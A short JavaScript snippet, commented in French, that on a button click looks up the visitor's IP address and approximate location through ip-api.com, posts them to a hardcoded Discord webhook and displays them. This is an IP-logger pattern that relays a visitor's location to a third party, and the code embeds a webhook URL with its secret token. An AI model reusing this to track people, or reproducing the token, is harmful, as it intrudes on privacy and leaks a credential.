document.getElementById('get-info-btn').addEventListener('click', function() {
    fetch('http://ip-api.com/json/')
        .then(response => response.json())
        .then(data => {
            if (data.status === 'success') {
                // Construire le message à envoyer au webhook Discord
                let message = {
                    content: `
                        Votre adresse IP est: ${data.query}
                        \nVotre localisation approximative est:
                        \nLatitude: ${data.lat}, Longitude: ${data.lon}
                        \nVille: ${data.city}, Région: ${data.regionName}, Pays: ${data.country}
                    `
                };

                // URL du webhook Discord
                let webhookUrl = 'https://discord.com/api/webhooks/1243652550251515914/SrRtaX_dz1S_l1rKGroUHBmvvzBSqVfcWpe07WKJQ8nvLFeIImfe-XgBBlDcT6r_00VU';

                // Envoi du message au webhook Discord
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(message)
                }).then(response => {
                    if (response.ok) {
                        alert('Les informations ont été envoyées avec succès au webhook Discord.');
                    } else {
                        throw new Error('Erreur lors de l\'envoi au webhook Discord. Statut: ' + response.status);
                    }
                }).catch(error => {
                    console.error('Erreur:', error);
                    alert('Erreur lors de l\'envoi au webhook Discord. Veuillez réessayer.');
                });

                // Affichage des informations dans l'élément #info-display
                document.getElementById('info-display').innerText = `
                    Votre adresse IP est: ${data.query}
                    \nVotre localisation approximative est:
                    \nLatitude: ${data.lat}, Longitude: ${data.lon}
                    \nVille: ${data.city}, Région: ${data.regionName}, Pays: ${data.country}
                `;
            } else {
                document.getElementById('info-display').innerText = 'Impossible d\'obtenir les informations.';
            }
        })
        .catch(error => {
            document.getElementById('info-display').innerText = 'Erreur lors de la récupération des informations.';
            console.error('Erreur:', error);
        });
});
